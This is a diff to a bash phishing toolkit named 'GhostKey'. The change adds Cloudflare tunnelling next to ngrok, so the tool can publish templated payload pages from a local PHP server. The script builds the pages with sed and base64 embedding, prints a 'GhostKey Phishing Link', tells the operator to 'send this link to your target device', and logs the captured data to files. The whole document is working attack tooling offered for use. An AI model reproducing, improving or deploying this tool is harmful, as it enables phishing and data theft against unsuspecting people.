@@ -52,7 +52,7 @@ printf "${CYAN}"
 echo ""
 print_centered "════════════════════════════════════════════════════"
 printf "${WHITE}"
-print_centered "Developed by: Your Name"
+print_centered "Developed by: Manjunath Yalam"
 printf "${GRAY}"
 print_centered "Enhanced Edition - 2024"
 printf "${CYAN}"
@@ -71,7 +71,7 @@ echo ""
 stop() {
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
-checkssh=$(ps aux | grep -o "ssh" | head -n1)
+checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)
 
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
@@ -82,8 +82,9 @@ if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
 fi
 
-if [[ $checkssh == *'ssh'* ]]; then
-killall -2 ssh > /dev/null 2>&1
+if [[ $checkcloudflared == *'cloudflared'* ]]; then
+pkill -f -2 cloudflared > /dev/null 2>&1
+killall -2 cloudflared > /dev/null 2>&1
 fi
 
 printf "\n${RED}[${WHITE}!${RED}] ${YELLOW}GhostKey shutting down...${NC}\n"
@@ -167,14 +168,12 @@ done
 
 payload_ngrok() {
 url=$redirect
-link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*"' | grep -o 'https://[^"]*' | head -n1)
+link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"[^"]*"' | grep -o 'https://[^"]*' | head -n1)
 
-# Alternative parsing method if first fails
 if [[ -z "$link" ]]; then
 link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | python3 -c "import sys, json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])" 2>/dev/null)
 fi
 
-# Another fallback using sed
 if [[ -z "$link" ]]; then
 link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | sed -n 's/.*"public_url":"\(https:\/\/[^"]*\)".*/\1/p' | head -n1)
 fi
@@ -183,15 +182,7 @@ if [[ -z "$link" ]]; then
 printf "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}\n"
 printf "${RED}║  ❌ NGROK TUNNEL FAILED                                   ║${NC}\n"
 printf "${RED}╚═══════════════════════════════════════════════════════════╝${NC}\n\n"
-printf "${YELLOW}📋 Troubleshooting Steps:${NC}\n\n"
-printf "  ${CYAN}Step 1:${NC} Authenticate ngrok (required for free accounts)\n"
-printf "     ${WHITE}./ngrok authtoken YOUR_TOKEN${NC}\n"
-printf "     ${GRAY}Get token from: ${CYAN}https://dashboard.ngrok.com/get-started/your-authtoken${NC}\n\n"
-printf "  ${CYAN}Step 2:${NC} Check ngrok API status\n"
-printf "     ${WHITE}curl http://127.0.0.1:4040/api/tunnels${NC}\n\n"
-printf "  ${CYAN}Step 3:${NC} Test ngrok manually\n"
-printf "     ${WHITE}./ngrok http 3333${NC}\n\n"
-exit 1
+return 1
 fi
 
 payload_name="index"
@@ -221,37 +212,75 @@ printf "${PURPLE}╚════════════════════
 printf "\n"
 printf "${CYAN}💡 Tip:${NC} ${GRAY}Send this link to your target device${NC}\n"
 printf "${CYAN}📊 Logs:${NC} ${GRAY}All captures will be saved to ghostkey.*.txt files${NC}\n\n"
+return 0
+}
+
+payload_cloudflare() {
+url=$redirect
+link=$(cat cloudflared.txt 2>/dev/null | grep -o 'https://[^ ]*trycloudflare.com')
+
+if [[ -z "$link" ]]; then
+printf "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}\n"
+printf "${RED}║  ❌ CLOUDFLARE TUNNEL FAILED                              ║${NC}\n"
+printf "${RED}╚═══════════════════════════════════════════════════════════╝${NC}\n\n"
+return 1
+fi
+
+payload_name="index"
+printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Building payload pages...${NC}\n"
+
+sed 's+forwarding_url+'$url'+g' post.php > cat.php
+sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
+sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
+sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html
+
+IFS=$'\n'
+data_base64=$(base64 -w 0 win2.html 2>/dev/null || base64 win2.html)
+temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"
+
+sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g' > index2.html
+
+printf "\n"
+printf "${PURPLE}╔═════════════════════════════════════════════════════════════════════════╗${NC}\n"
+printf "${PURPLE}║                                                                         ║${NC}\n"
+printf "${PURPLE}║${NC}  ${GREEN}✓${NC} ${CYAN}GhostKey Phishing Link (Cloudflare):${NC}                             ${PURPLE}║${NC}\n"
+printf "${PURPLE}║${NC}    ${WHITE}%s${NC}%-$((71-${#link}))s${PURPLE}║${NC}\n" "$link" ""
+printf "${PURPLE}║                                                                         ║${NC}\n"
+printf "${PURPLE}║${NC}  ${GREEN}✓${NC} ${CYAN}Target Redirect URL:${NC}                                             ${PURPLE}║${NC}\n"
+printf "${PURPLE}║${NC}    ${GRAY}%s${NC}%-$((71-${#url}))s${PURPLE}║${NC}\n" "$url" ""
+printf "${PURPLE}║                                                                         ║${NC}\n"
+printf "${PURPLE}╚═════════════════════════════════════════════════════════════════════════╝${NC}\n"
+printf "\n"
+printf "${CYAN}💡 Tip:${NC} ${GRAY}Send this link to your target device${NC}\n"
+printf "${CYAN}📊 Logs:${NC} ${GRAY}All captures will be saved to ghostkey.*.txt files${NC}\n\n"
+return 0
 }
 
 ngrok_server() {
+printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Attempting to use Ngrok...${NC}\n"
+
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "${RED}[!]${NC} unzip required but not installed. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "${RED}[!]${NC} wget required but not installed. Aborting."; exit 1; }
-printf "${CYAN}[${WHITE}↓${CYAN}] ${YELLOW}Downloading ngrok binary...${NC}\n"
+command -v unzip > /dev/null 2>&1 || { echo >&2 "${RED}[!]${NC} unzip required. Install: sudo apt-get install unzip"; return 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "${RED}[!]${NC} wget required. Install: sudo apt-get install wget"; return 1; }
+printf "${CYAN}[${WHITE}↓${CYAN}] ${YELLOW}Downloading ngrok...${NC}\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz 
+if [[ -e ngrok-v3-stable-linux-arm64.tgz ]]; then
+tar xvzf ngrok-v3-stable-linux-arm64.tgz > /dev/null 2>&1
 chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "${RED}[!]${NC} Download error. For Termux: ${WHITE}pkg install wget${NC}\n"
-exit 1
+rm -rf ngrok-v3-stable-linux-arm64.tgz
 fi
 else
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+if [[ -e ngrok-v3-stable-linux-amd64.tgz ]]; then
+tar xvzf ngrok-v3-stable-linux-amd64.tgz > /dev/null 2>&1
 chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "${RED}[!]${NC} Download error\n"
-exit 1
+rm -rf ngrok-v3-stable-linux-amd64.tgz
 fi
 fi
 fi
@@ -260,50 +289,94 @@ pkill -f php > /dev/null 2>&1
 pkill -f ngrok > /dev/null 2>&1
 sleep 2
 
-printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Starting PHP web server on localhost:3333...${NC}\n"
+printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Starting PHP server (port 3333)...${NC}\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 3
 
-printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Launching ngrok tunnel service...${NC}\n"
+printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Launching ngrok tunnel...${NC}\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 
-printf "${CYAN}[${WHITE}⏳${CYAN}] ${YELLOW}Establishing secure tunnel connection...${NC}\n"
-sleep 10
+printf "${CYAN}[${WHITE}⏳${CYAN}] ${YELLOW}Waiting for tunnel (15 seconds)...${NC}\n"
+sleep 15
 
-printf "${CYAN}[${WHITE}🔍${CYAN}] ${YELLOW}Retrieving public URL from ngrok API...${NC}\n"
+printf "${CYAN}[${WHITE}🔍${CYAN}] ${YELLOW}Fetching ngrok URL...${NC}\n"
 
-for i in {1..8}; do
-link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*"' | grep -o 'https://[^"]*' | head -n1)
+for i in {1..5}; do
+link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"[^"]*"' | grep -o 'https://[^"]*' | head -n1)
 
 if [[ -n "$link" ]]; then
-printf "${GREEN}[${WHITE}✓${GREEN}] ${YELLOW}Tunnel established successfully!${NC}\n\n"
-sleep 1
-break
+printf "${GREEN}[${WHITE}✓${GREEN}] ${YELLOW}Ngrok tunnel established!${NC}\n\n"
+payload_ngrok
+if [[ $? -eq 0 ]]; then
+return 0
+fi
 fi
 
-printf "${YELLOW}[${WHITE}⏳${YELLOW}] ${GRAY}Attempt $i/8: Waiting for tunnel response... (3s)${NC}\n"
+printf "${YELLOW}[${WHITE}⏳${YELLOW}] ${GRAY}Attempt $i/5: Retrying... (3s)${NC}\n"
 sleep 3
 done
 
-if [[ -z "$link" ]]; then
-printf "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}\n"
-printf "${RED}║  ❌ TUNNEL ESTABLISHMENT FAILED                           ║${NC}\n"
-printf "${RED}╚═══════════════════════════════════════════════════════════╝${NC}\n\n"
-printf "${YELLOW}🔧 Common Solutions:${NC}\n\n"
-printf "  ${CYAN}1.${NC} ${WHITE}Ngrok Authentication Required${NC}\n"
-printf "     Run: ${WHITE}./ngrok authtoken YOUR_TOKEN${NC}\n"
-printf "     Get token: ${CYAN}https://dashboard.ngrok.com/get-started/your-authtoken${NC}\n\n"
-printf "  ${CYAN}2.${NC} ${WHITE}Check Ngrok Status${NC}\n"
-printf "     Run: ${WHITE}curl http://127.0.0.1:4040/api/tunnels${NC}\n\n"
-printf "  ${CYAN}3.${NC} ${WHITE}Manual Ngrok Test${NC}\n"
-printf "     Run: ${WHITE}./ngrok http 3333${NC}\n\n"
-printf "  ${CYAN}4.${NC} ${WHITE}Network/Firewall Issues${NC}\n"
-printf "     Check your internet connection and firewall settings\n\n"
-exit 1
+printf "${RED}[${WHITE}!${RED}] ${YELLOW}Ngrok failed. This usually means authentication is required.${NC}\n"
+printf "${CYAN}Setup ngrok:${NC}\n"
+printf "  1. Get token: ${WHITE}https://dashboard.ngrok.com/get-started/your-authtoken${NC}\n"
+printf "  2. Run: ${WHITE}./ngrok authtoken YOUR_TOKEN${NC}\n\n"
+return 1
+}
+
+cloudflared_server() {
+printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Switching to Cloudflare Tunnel (NO AUTH NEEDED!)...${NC}\n\n"
+
+if [[ -e cloudflared ]]; then
+echo ""
+else
+printf "${CYAN}[${WHITE}↓${CYAN}] ${YELLOW}Downloading cloudflared...${NC}\n"
+arch=$(uname -m)
+
+if [[ "$arch" == "x86_64" ]]; then
+wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
+elif [[ "$arch" == "aarch64" ]]; then
+wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
+else
+wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
 fi
 
-payload_ngrok
-checkfound
+chmod +x cloudflared
+fi
+
+pkill -f php > /dev/null 2>&1
+pkill -f cloudflared > /dev/null 2>&1
+sleep 2
+
+printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Starting PHP server (port 3333)...${NC}\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 3
+
+printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Creating Cloudflare tunnel...${NC}\n"
+rm -f cloudflared.txt
+./cloudflared tunnel --url http://localhost:3333 > cloudflared.txt 2>&1 &
+
+printf "${CYAN}[${WHITE}⏳${CYAN}] ${YELLOW}Establishing connection (10 seconds)...${NC}\n"
+sleep 10
+
+printf "${CYAN}[${WHITE}🔍${CYAN}] ${YELLOW}Retrieving Cloudflare URL...${NC}\n"
+
+for i in {1..8}; do
+link=$(cat cloudflared.txt 2>/dev/null | grep -o 'https://[^ ]*trycloudflare.com')
+
+if [[ -n "$link" ]]; then
+printf "${GREEN}[${WHITE}✓${GREEN}] ${YELLOW}Cloudflare tunnel established!${NC}\n\n"
+payload_cloudflare
+if [[ $? -eq 0 ]]; then
+return 0
+fi
+fi
+
+printf "${YELLOW}[${WHITE}⏳${YELLOW}] ${GRAY}Attempt $i/8: Waiting... (2s)${NC}\n"
+sleep 2
+done
+
+printf "${RED}[${WHITE}!${RED}] ${YELLOW}Cloudflare tunnel failed!${NC}\n"
+return 1
 }
 
 redirect() {
@@ -320,4 +393,52 @@ printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Redirect URL set to:${NC} ${WHITE}%
 banner
 dependencies
 redirect
-ngrok_server
+
+printf "\n${PURPLE}╔═══════════════════════════════════════════════════════════╗${NC}\n"
+printf "${PURPLE}║${NC}  ${CYAN}Select Tunneling Method:${NC}                               ${PURPLE}║${NC}\n"
+printf "${PURPLE}╚═══════════════════════════════════════════════════════════╝${NC}\n"
+printf "${WHITE}[${CYAN}1${WHITE}]${NC} Ngrok ${GRAY}(requires authentication)${NC}\n"
+printf "${WHITE}[${CYAN}2${WHITE}]${NC} Cloudflare ${GRAY}(NO authentication needed - RECOMMENDED)${NC}\n"
+printf "${WHITE}[${CYAN}3${WHITE}]${NC} Try Both ${GRAY}(Ngrok first, then Cloudflare)${NC}\n"
+printf "\n${CYAN}└─>${NC} "
+read tunnel_choice
+
+case $tunnel_choice in
+    1)
+        printf "\n${CYAN}[${WHITE}ℹ${CYAN}] ${YELLOW}Using Ngrok...${NC}\n"
+        ngrok_server
+        if [[ $? -eq 0 ]]; then
+            checkfound
+        else
+            printf "\n${RED}[${WHITE}!${RED}] ${YELLOW}Ngrok failed completely. Exiting.${NC}\n"
+            exit 1
+        fi
+        ;;
+    2)
+        printf "\n${CYAN}[${WHITE}ℹ${CYAN}] ${YELLOW}Using Cloudflare Tunnel...${NC}\n"
+        cloudflared_server
+        if [[ $? -eq 0 ]]; then
+            checkfound
+        else
+            printf "\n${RED}[${WHITE}!${RED}] ${YELLOW}Cloudflare failed. Exiting.${NC}\n"
+            exit 1
+        fi
+        ;;
+    3|"")
+        printf "\n${CYAN}[${WHITE}ℹ${CYAN}] ${YELLOW}Trying Ngrok first...${NC}\n"
+        ngrok_server
+        if [[ $? -ne 0 ]]; then
+            printf "\n${YELLOW}[${WHITE}!${YELLOW}] ${CYAN}Ngrok failed. Falling back to Cloudflare...${NC}\n\n"
+            cloudflared_server
+            if [[ $? -ne 0 ]]; then
+                printf "\n${RED}[${WHITE}!${RED}] ${YELLOW}Both methods failed. Exiting.${NC}\n"
+                exit 1
+            fi
+        fi
+        checkfound
+        ;;
+    *)
+        printf "${RED}[${WHITE}!${RED}] ${YELLOW}Invalid choice. Exiting.${NC}\n"
+        exit 1
+        ;;
+esac
